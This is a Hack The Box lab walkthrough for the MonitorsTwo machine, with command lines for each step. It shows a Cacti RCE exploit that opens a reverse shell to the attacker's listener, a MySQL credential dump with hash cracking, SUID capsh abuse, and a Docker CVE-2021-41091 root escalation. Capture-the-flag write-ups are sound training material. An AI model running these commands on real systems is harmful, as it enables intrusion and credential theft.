---
title: "HTB: MonitorsTwo"
date: 2024-06-24
image: 
  path: /assets/img/HTB/MonitorsTwo/MonitorsTwo.png
categories: [Hack The Box, Machines]
---

## Information

- OS: Linux
- Difficult: Easy
- IP address: 10.10.11.211

## Enumeration

### Ports and services

Firstly, we enumerate open ports on the machine 

`sudo nmap -sS -p- --open --min-rate=5000 -v -n -Pn 10.10.11.211 -oG allPorts`
![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622195247.png)

We only have the ports 22 and 80, which run ssh and http, lets see what services version they run

`sudo nmap -sCV -p22,80 -v -n -Pn 10.10.11.211 -oN services`
![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622195517.png)

So, target machine's running OpenSSH 8.2p1 and a nginx 1.18.0

### HTTP server

Going into http://10.10.11.211 and just show us a user login page:

![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622195745.png)

The login page belongs to Cacti, which is a monitoring software that we can consult in their [official website](https://www.cacti.net/)

Fuzzing the webpage with ffuf will show us

`ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -c -u http://10.10.11.211/FUZZ -e .php,.html,.txt -fs 13844`
![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622200020.png)

Navigating to any resource of this site only shows us the login page, so we  can assume that we need to be authenticated to access it

*utilities.php*
![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622200427.png)

## Shell as www-data 

The Cacti's version is 1.2.22. If we make a search we can found [CVE-2022-46169](https://www.cvedetails.com/cve/CVE-2022-46169/) which allows a RCE, and a [exploit](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22) associate

Before use it we will open a listener on our machine on port 4242 `nc -nvlp 4242`
and then use the exploit, indicating the web's url, our ip and our listener's port

`python3 rceExploit.py  -u http://10.10.11.211 --LHOST=10.10.14.61 --LPORT=4242`
![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622204450.png)

And on our nc listener we received a shell

![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622204517.png)

To stabilize a shell use on the target machine `script /dev/null -qc /bin/bash`, then use CTRL + Z to suspend the reverse shell and use `stty raw -echo; fg`

![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622205817.png)

Now we can use CTRL + C to clean the shell without kill it, but we cannot use CTROL + l to clean the shell yet, for it we'll use `export TERM=xterm`

![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622210018.png)

And we got a full interactive shell

## Shell as marcus

### Enumerating Docker container

On target system we can see we are www-datals, the kernel version is 5.4.0-147-generid and the groups we belongs to 

![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622210307.png)

In the root directory we have a *.dockerenv* file, so we are in a docker container. Also we have a script called *entrypoint.sh*

![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622211014.png)

*entrypoint.sh*
![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622211042.png)

This script leak credentials for a mysql database. Lets connect to this DB

`mysql -h db --user=root -proot`
![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622211424.png)

Existent databases:

![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622211512.png){: left }

Enumerating the cacti's database tables
![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622211632.png)
![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622211645.png)

The user_auth table saves authentication info

![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622212017.png)

Lets show the users, passwords and emails

![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622212102.png)

user_auth shows 3 users, where 2 of them have hashes. We will add them to *hashes.txt* on our attacking machine and try to crack them with the *rockyou* wordlist

`nano hashes.txt`
![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622220337.png)

`john --wordlist=/usr/share/wordlist/rockyou.txt hashes.txt`
![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622221016.png)

Lets try to connect via SSH with these credentials

`ssh marcus@10.10.11.211`
![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622221248.png)

Now we are in the docker's host machine, and we have a message saying we have a mail

## Shell as root

In this machine we are marcus user, we don't belong to any special group and the kernel version is 5.4.0-147-generic

![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622223339.png)

The email is from the security team advising us that there are some vulnerabilities to fix: CVE-2021-33033 on linux kernels before 5.11.14, CVE-2020-25706 on Cacti 1.2.13 and CVE-2021-41091 on Docker versions before 20.10.9

`cat /var/mail/marcus`
![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622230128.png)

For the first CVE, machine's kernel is based in 5.4 series while the vulnerability is for 5.11 one.

The second vulnerability, CVE-2020-25706 is a XSS so it doesn't help us to escalate privileges. 

So lets check the third one, CVE-2021-41091 cause our docker is running version 20.10.5, older than 20.10.9

![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622232349.png)

### Privileges escalation in Docker container

In order to exploit this vulnerability we need to be root on the docker container

Listing the SUID permissions we found that *capsh* has it. Searching in [GTFOBins](https://gtfobins.github.io/) we'll know how to abuse this to escalate privileges

`find / -perm -4000 2>/dev/null`
`/sbin/capsh --gid=0 --uid=0 --`
![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622233552.png)

### Exploiting CVE-2021-41091

In this [GitHub repository](https://github.com/UncleJ4ck/CVE-2021-41091) there are a exploit and the instructions to use it:

- To assign SUID permission on /bin/bash in the container
	`chmod u+s /bin/bash`
	![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622234030.png)
- Then we already can execute the exploit on the host machine
	`./exp.sh`
	![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622235057.png)
- The exploit says us that in case we weren't root, go to a provided path and execute `./bin/bash p`
	![](/assets/img/HTB/MonitorsTwo/Pasted image 20240622235219.png)

And finally we have pwned the machine